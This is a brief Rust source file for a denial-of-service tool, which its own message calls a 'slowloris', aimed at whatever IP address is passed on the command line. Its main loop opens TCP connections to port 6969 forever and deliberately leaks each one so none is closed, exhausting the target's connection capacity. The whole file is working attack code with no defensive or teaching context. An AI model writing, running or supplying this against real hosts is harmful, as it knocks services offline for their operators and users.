use std::net::TcpStream;
use std::env;

fn main() {
    let mut args = env::args();
    let _program = args.next().expect("program");
    let ip = args.next().expect("Provide ip");
    let address = format!("{ip}:6969");

    println!("Trying to slowloris {address}...");
    loop {
        let _ = TcpStream::connect(&address).map(|stream| {
            Box::leak(Box::new(stream))
        });
    }
}
